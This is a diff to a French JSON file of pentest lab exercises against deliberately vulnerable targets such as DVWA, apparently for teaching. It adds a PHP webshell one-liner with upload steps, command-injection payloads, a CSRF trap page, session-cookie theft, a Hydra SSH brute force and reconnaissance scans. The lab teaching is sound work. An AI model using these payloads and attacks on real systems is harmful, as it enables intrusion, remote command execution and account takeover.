@@ -202,8 +202,8 @@
       "tasks": [
         {
           "title": "Télécharger et placer l’image",
-          "content": "Télécharge image_stego.jpg depuis http://localhost:8080/challenges/stego/ (ou la room Stéganographie). Copie le fichier dans le conteneur : docker cp image_stego.jpg lab-attaquant:/workspace/ (depuis le répertoire où tu as téléchargé).",
-          "command": "docker cp ./image_stego.jpg lab-attaquant:/workspace/",
+          "content": "Depuis le terminal web (ou make shell), récupère l'image directement : wget http://gateway/challenges/stego/image_stego.jpg -O /workspace/image_stego.jpg. La plateforme est joignable à l'hôte gateway depuis le conteneur. Sinon télécharge l'image sur la plateforme puis docker cp vers lab-attaquant:/workspace/.",
+          "command": "wget http://gateway/challenges/stego/image_stego.jpg -O /workspace/image_stego.jpg",
           "tip": "Ou monte un volume entre l’hôte et l’attaquant pour partager des fichiers.",
           "learn": "En CTF et forensique, on reçoit souvent des fichiers à analyser. Les placer dans un répertoire commun (ex: /workspace) permet d’utiliser les outils du conteneur."
         },
@@ -237,15 +237,15 @@
       "tasks": [
         {
           "title": "Décoder le Base64",
-          "content": "Télécharge flag_b64.txt depuis la plateforme. Le contenu est du Base64. Décode-le : base64 -d flag_b64.txt (ou cat flag_b64.txt | base64 -d). Tu obtiens un texte en clair (le flag).",
-          "command": "cat flag_b64.txt | base64 -d",
+          "content": "Depuis le terminal attaquant : wget http://gateway/challenges/crypto/flag_b64.txt -O /workspace/flag_b64.txt && wget http://gateway/challenges/crypto/flag.enc -O /workspace/flag.enc. Puis cd /workspace && base64 -d flag_b64.txt pour le premier flag.",
+          "command": "wget http://gateway/challenges/crypto/flag_b64.txt -O /workspace/flag_b64.txt && wget http://gateway/challenges/crypto/flag.enc -O /workspace/flag.enc && cd /workspace && base64 -d flag_b64.txt",
           "tip": "Base64 n’est pas du chiffrement : c’est un encodage réversible sans clé. Très courant dans les CTF et les payloads.",
           "learn": "Reconnaître Base64 : alphabet A-Za-z0-9+/ et souvent = en padding. Toujours identifier le type (file, tête de fichier) avant d’attaquer."
         },
         {
           "title": "Déchiffrer le fichier OpenSSL",
-          "content": "Télécharge flag.enc. Il a été chiffré avec openssl enc -aes-256-cbc. Pour déchiffrer : openssl enc -d -aes-256-cbc -in flag.enc -out flag.txt. Quand on te demande le mot de passe : labcrypto.",
-          "command": "openssl enc -d -aes-256-cbc -in flag.enc -out flag.txt -k labcrypto",
+          "content": "Dans /workspace : openssl enc -d -aes-256-cbc -in flag.enc -out flag.txt -k labcrypto. Mot de passe du défi : labcrypto.",
+          "command": "cd /workspace && openssl enc -d -aes-256-cbc -in flag.enc -out flag.txt -k labcrypto && cat flag.txt",
           "tip": "L’option -k labcrypto évite la demande interactive. En CTF si le mot de passe est inconnu, on utilise des wordlists.",
           "learn": "OpenSSL enc permet du chiffrement symétrique (AES, etc.). En prod, la gestion des clés est critique ; un mot de passe faible = vulnérabilité."
         }
@@ -337,6 +337,167 @@
           "tip": "Sans -T fields tu as plus de détails. -Y 'tcp.flags.syn==1' pour les nouvelles connexions TCP.",
           "learn": "tshark = Wireshark en ligne de commande. Les filtres (-Y) permettent de cibler du HTTP, du DNS, des scans, etc."
         }
+      ]
+    },
+    {
+      "id": "scenario-11-csrf-dvwa",
+      "title": "Scénario 11 : CSRF – Falsification de requête cross-site (DVWA)",
+      "description": "Une attaque CSRF force le navigateur d’une victime connectée à envoyer une requête non désirée à un site. Tu vas reproduire un changement de mot de passe via CSRF sur DVWA.",
+      "difficulty": "Easy",
+      "category": "web",
+      "time": "20 min",
+      "machines": [
+        { "name": "DVWA", "urlKey": "dvwa", "note": "admin / password" },
+        { "name": "Terminal attaquant", "urlKey": "terminal", "note": "Pour héberger une page malveillante" }
+      ],
+      "tasks": [
+        { "title": "Préparer DVWA", "content": "Connecte-toi à DVWA, va dans « CSRF », niveau Low. Tu vois un formulaire de changement de mot de passe.", "command": null, "tip": "Le token CSRF en Low est prévisible ou absent.", "learn": "CSRF = l’attaquant profite de la session de la victime pour exécuter des actions à son insu." },
+        { "title": "Analyser la requête", "content": "Change le mot de passe et observe la requête (URL ou DevTools). Note les paramètres (password_new, password_conf, etc.).", "command": null, "tip": "En Low, l’URL peut être rejouée telle quelle.", "learn": "Sans token imprévisible, toute requête valide peut être forgée depuis un autre site." },
+        { "title": "Créer une page piège", "content": "Crée une page HTML qui contient un formulaire ou un lien pointant vers l’URL de changement de mot de passe avec les paramètres choisis. Ouvre-la (ou envoie le lien à une « victime » connectée).", "command": null, "tip": "Tu peux utiliser un formulaire auto-submit avec JavaScript.", "learn": "Les défenses : token CSRF, SameSite sur les cookies, vérification Referer/Origin." }
+      ]
+    },
+    {
+      "id": "scenario-12-file-upload-dvwa",
+      "title": "Scénario 12 : Upload de fichier malveillant (DVWA)",
+      "description": "Si une application permet d’uploader des fichiers sans valider le type ou le contenu, on peut parfois uploader un webshell et exécuter du code sur le serveur.",
+      "difficulty": "Easy",
+      "category": "web",
+      "time": "25 min",
+      "machines": [
+        { "name": "DVWA", "urlKey": "dvwa", "note": "admin / password, Create/Reset DB" },
+        { "name": "Terminal attaquant", "urlKey": "terminal", "note": "Pour créer le fichier PHP" }
+      ],
+      "tasks": [
+        { "title": "Accéder au module File Upload", "content": "Dans DVWA, va dans « File Upload », niveau Low. Tu peux uploader une image.", "command": null, "tip": "En Low, l’extension .php peut être acceptée.", "learn": "La validation doit porter sur le type MIME, l’extension, et idéalement le contenu (magic bytes)." },
+        { "title": "Préparer un webshell", "content": "Crée un fichier shell.php contenant <?php system($_GET['cmd']); ?> (ou équivalent). Depuis l’attaquant : echo '<?php system($_GET[\"cmd\"]); ?>' > shell.php.", "command": "echo '<?php system($_GET[\"cmd\"]); ?>' > shell.php", "tip": "En lab, on utilise des commandes simples pour la preuve (id, whoami).", "learn": "Un webshell donne un accès en ligne de commande via le navigateur." },
+        { "title": "Uploader et exécuter", "content": "Upload shell.php (renomme en .jpg si besoin pour contourner en Medium). Accède à l’URL du fichier uploadé avec ?cmd=id pour exécuter une commande.", "command": null, "tip": "Le chemin d’upload est souvent /hackable/uploads/ ou indiqué après upload.", "learn": "Toujours stocker les uploads hors de la racine web ou avec des noms imprévisibles." }
+      ]
+    },
+    {
+      "id": "scenario-13-hydra-ssh",
+      "title": "Scénario 13 : Brute force SSH avec Hydra",
+      "description": "Tu as trouvé le port SSH ouvert sur vuln-network. Tu vas utiliser Hydra pour tester des combinaisons login/mot de passe et obtenir un accès.",
+      "difficulty": "Easy",
+      "category": "network",
+      "time": "20 min",
+      "machines": [
+        { "name": "Terminal attaquant", "urlKey": "terminal", "note": "hydra installé" },
+        { "name": "vuln-network", "url": "#", "note": "ssh root@vuln-network" }
+      ],
+      "tasks": [
+        { "title": "Vérifier l’accès SSH", "content": "Depuis l’attaquant : nmap -p 22 vuln-network pour confirmer que le port 22 est ouvert.", "command": "nmap -p 22 vuln-network", "tip": "Le mot de passe du lab est labpassword ; pour l’exercice tu peux utiliser une petite wordlist.", "learn": "Hydra automatise les tentatives de connexion (SSH, HTTP, FTP, etc.)." },
+        { "title": "Créer une petite wordlist", "content": "Crée un fichier passwords.txt avec quelques mots de passe (dont labpassword). Ex : echo -e 'labpassword\nadmin\nroot\npassword' > passwords.txt", "command": "echo -e 'labpassword\\nadmin\\nroot' > /workspace/passwords.txt", "tip": "En pentest réel on utilise rockyou.txt ou des listes ciblées.", "learn": "Une wordlist de qualité augmente les chances sans exploser le nombre de tentatives." },
+        { "title": "Lancer Hydra", "content": "hydra -l root -P passwords.txt ssh://vuln-network -t 4. Une fois le mot de passe trouvé, connecte-toi en SSH pour confirmer.", "command": "hydra -l root -P passwords.txt ssh://vuln-network -t 4", "tip": "-t 4 = 4 tâches parallèles. Adapte selon la cible.", "learn": "Limiter le débit et utiliser des listes raisonnables pour éviter le blocage et les abus." }
+      ]
+    },
+    {
+      "id": "scenario-14-nikto-scan",
+      "title": "Scénario 14 : Scan de vulnérabilités web avec Nikto",
+      "description": "Nikto scanne un serveur web pour détecter des fichiers sensibles, des versions vulnérables et des misconfigurations. Tu l’utilises sur une cible du lab.",
+      "difficulty": "Easy",
+      "category": "web",
+      "time": "15 min",
+      "machines": [
+        { "name": "Terminal attaquant", "urlKey": "terminal", "note": "nikto" },
+        { "name": "DVWA ou autre", "urlKey": "dvwa", "note": "Cible web" }
+      ],
+      "tasks": [
+        { "title": "Lancer Nikto sur une cible", "content": "Depuis l’attaquant : nikto -h http://dvwa. Tu peux remplacer dvwa par juice-shop ou bwapp (même réseau).", "command": "nikto -h http://dvwa", "tip": "Nikto teste des milliers d’URLs et en-têtes. La sortie peut être longue.", "learn": "Nikto est un scanner générique ; il faut trier les vrais positifs des faux positifs." },
+        { "title": "Interpréter les résultats", "content": "Repère les lignes « + » (trouvées) : répertoires sensibles, versions, options dangereuses. Note ce qui pourrait être exploitable (ex: /phpmyadmin, /admin).", "command": null, "tip": "Export avec -o pour garder un rapport : nikto -h http://dvwa -o report.html", "learn": "Un bon rapport de scan cite les preuves et les recommandations par finding." }
+      ]
+    },
+    {
+      "id": "scenario-15-theharvester-osint",
+      "title": "Scénario 15 : OSINT – Collecte d’infos avec theHarvester",
+      "description": "En phase de reconnaissance, on collecte des informations sur une cible (emails, sous-domaines, hôtes) depuis des moteurs de recherche et des API. theHarvester automatise une partie de cette collecte.",
+      "difficulty": "Easy",
+      "category": "osint",
+      "time": "20 min",
+      "machines": [
+        { "name": "Terminal attaquant", "urlKey": "terminal", "note": "theHarvester (pip)" }
+      ],
+      "tasks": [
+        { "title": "Lancer theHarvester", "content": "theHarvester -d example.com -b bing (ou -b google, duckduckgo). -d = domaine cible. En lab tu peux utiliser un domaine public.", "command": "theHarvester -d example.com -b bing", "tip": "Certaines sources nécessitent des clés API. Bing/DuckDuckGo fonctionnent souvent sans.", "learn": "OSINT = Open Source Intelligence : tout ce qui est public peut servir à préparer une attaque." },
+        { "title": "Exploiter les résultats", "content": "Note les emails, sous-domaines et IPs trouvés. Ces infos servent au phishing, à l’énumération ou au ciblage de services.", "command": null, "tip": "Export en JSON avec -f resultat.json pour réutiliser les données.", "learn": "La phase OSINT est cruciale : plus tu en sais sur la cible, plus tes attaques sont ciblées." }
+      ]
+    },
+    {
+      "id": "scenario-16-gobuster-dir",
+      "title": "Scénario 16 : Découverte de répertoires avec Gobuster",
+      "description": "Les applications web exposent parfois des répertoires cachés (admin, backup, .git). Gobuster (ou dirb) teste une wordlist d’URLs pour les découvrir.",
+      "difficulty": "Easy",
+      "category": "web",
+      "time": "20 min",
+      "machines": [
+        { "name": "Terminal attaquant", "urlKey": "terminal", "note": "gobuster" },
+        { "name": "DVWA ou vuln-api", "urlKey": "dvwa", "note": "Cible" }
+      ],
+      "tasks": [
+        { "title": "Installer / lancer Gobuster", "content": "gobuster dir -u http://dvwa -w /usr/share/wordlists/dirb/common.txt -t 20. -u = URL de base, -w = wordlist, -t = threads.", "command": "gobuster dir -u http://dvwa -w /usr/share/wordlists/dirb/common.txt -t 20", "tip": "Si dirb/common.txt n’existe pas, utilise une petite wordlist (ex: admin, login, backup).", "learn": "La découverte de répertoires révèle des panneaux d’admin, des backups ou des fichiers de config." },
+        { "title": "Analyser les réponses", "content": "Gobuster affiche les codes HTTP (200, 301, 403). Les 200/301 indiquent des chemins existants. Visite-les dans le navigateur pour voir le contenu.", "command": null, "tip": "Filtre les tailles de réponse avec -b pour ignorer les 404 de même taille.", "learn": "En pentest, on documente chaque endpoint découvert pour la suite du test." }
+      ]
+    },
+    {
+      "id": "scenario-17-command-injection",
+      "title": "Scénario 17 : Injection de commandes (DVWA)",
+      "description": "Si une application passe une entrée utilisateur à une fonction système (ex: ping, exec), une injection de commandes peut permettre d’exécuter des commandes arbitraires sur le serveur.",
+      "difficulty": "Easy",
+      "category": "web",
+      "time": "20 min",
+      "machines": [
+        { "name": "DVWA", "urlKey": "dvwa", "note": "Command Injection, niveau Low" },
+        { "name": "Terminal attaquant", "urlKey": "terminal", "note": "Pour comprendre les payloads" }
+      ],
+      "tasks": [
+        { "title": "Accéder au module", "content": "Dans DVWA, va dans « Command Injection », niveau Low. Tu as un champ qui exécute probablement ping.", "command": null, "tip": "En Low, la chaîne est concaténée telle quelle à la commande.", "learn": "Commande typique côté serveur : exec('ping -c 4 ' . $_GET['ip']); il suffit d’ajouter ; ou | pour une autre commande." },
+        { "title": "Tester l’injection", "content": "Entre 127.0.0.1; id ou 127.0.0.1 | whoami. Si tu vois la sortie de id/whoami, l’injection fonctionne.", "command": null, "tip": "Selon l’OS : ; ou & ou | ou &&. Sur Windows : & ou |.", "learn": "Ne jamais passer d’entrée utilisateur non sanitized à system(), exec(), passthru(), etc." }
+      ]
+    },
+    {
+      "id": "scenario-18-cookie-session",
+      "title": "Scénario 18 : Vol et abus de cookie de session",
+      "description": "Les cookies de session identifient l’utilisateur. Si un attaquant les récupère (XSS, sniffing, vol), il peut se faire passer pour la victime. Tu explores le mécanisme sur DVWA.",
+      "difficulty": "Easy",
+      "category": "web",
+      "time": "15 min",
+      "machines": [
+        { "name": "DVWA", "urlKey": "dvwa", "note": "admin / password" },
+        { "name": "DevTools navigateur", "url": "#", "note": "Application > Cookies" }
+      ],
+      "tasks": [
+        { "title": "Identifier le cookie de session", "content": "Connecte-toi à DVWA. Ouvre les DevTools (F12), onglet Application (ou Storage), section Cookies. Repère le cookie (ex: PHPSESSID).", "command": null, "tip": "Ce cookie est envoyé à chaque requête ; sans lui tu serais déconnecté.", "learn": "HttpOnly limite l’accès au cookie par JavaScript (réduit le vol via XSS)." },
+        { "title": "Simuler un vol", "content": "Copie la valeur du cookie. Ouvre une fenêtre de navigation privée (ou un autre navigateur), va sur DVWA, injecte le cookie (extension ou DevTools). Tu es connecté comme la victime.", "command": null, "tip": "En conditions réelles, l’attaquant récupère le cookie via XSS (document.cookie) ou MITM.", "learn": "HTTPS + HttpOnly + SameSite renforcent la sécurité des sessions." }
+      ]
+    },
+    {
+      "id": "scenario-19-burp-curl",
+      "title": "Scénario 19 : Rejouer des requêtes avec cURL",
+      "description": "En pentest web, on modifie et rejoue des requêtes (comme avec Burp). Sans Burp, on peut utiliser cURL pour rejouer une requête copiée depuis les DevTools.",
+      "difficulty": "Easy",
+      "category": "web",
+      "time": "15 min",
+      "machines": [
+        { "name": "DVWA ou vuln-api", "urlKey": "dvwa", "note": "Cible" },
+        { "name": "Terminal attaquant", "urlKey": "terminal", "note": "curl" }
+      ],
+      "tasks": [
+        { "title": "Copier une requête en cURL", "content": "Dans le navigateur, ouvre DevTools > Network. Effectue une action (ex: login DVWA). Clic droit sur la requête > Copy > Copy as cURL.", "command": null, "tip": "Colle dans un terminal (hôte ou attaquant) pour rejouer. Adapte l’URL si tu es dans le conteneur (dvwa au lieu de localhost).", "learn": "Rejouer des requêtes permet de tester des payloads sans refaire tout le parcours." },
+        { "title": "Modifier et rejouer", "content": "Modifie le corps ou les paramètres dans la ligne cURL (ex: change le mot de passe, l’id utilisateur). Exécute. Tu simules ce que fait un proxy comme Burp.", "command": "curl -X POST http://dvwa/login -d 'username=admin&password=test' -H 'Content-Type: application/x-www-form-urlencoded'", "tip": "Pour les cookies, ajoute -b 'PHPSESSID=xxx'.", "learn": "L’automatisation (scripts, Burp Intruder) repose sur la relecture de requêtes modifiées." }
+      ]
+    },
+    {
+      "id": "scenario-20-dns-enum",
+      "title": "Scénario 20 : Énumération DNS et sous-domaines",
+      "description": "Avant d’attaquer un domaine, on énumère les sous-domaines et les enregistrements DNS pour élargir la surface d’attaque. Tu utilises dig et des outils du lab.",
+      "difficulty": "Easy",
+      "category": "network",
+      "time": "20 min",
+      "machines": [
+        { "name": "Terminal attaquant", "urlKey": "terminal", "note": "dig, nslookup, theHarvester" }
+      ],
+      "tasks": [
+        { "title": "Requêtes DNS de base", "content": "dig example.com A et dig example.com MX. Note les IP et les serveurs mail. dig example.com ANY pour tout type.", "command": "dig example.com A\n dig example.com MX", "tip": "En lab Docker les noms sont résolus par le réseau interne ; pour un vrai domaine utilise un nom public.", "learn": "DNS révèle des serveurs, des sous-domaines et parfois des infos de configuration." },
+        { "title": "Sous-domaines avec theHarvester", "content": "theHarvester -d example.com -b dnsdumpster (ou bing). Les sous-domaines trouvés peuvent être des cibles (dev., admin., api.).", "command": "theHarvester -d example.com -b bing", "tip": "Combine avec des wordlists (subdomains.txt) pour du brute force de sous-domaines.", "learn": "Un sous-domaine oublié peut être moins sécurisé que le domaine principal." }
       ]
     }
   ]
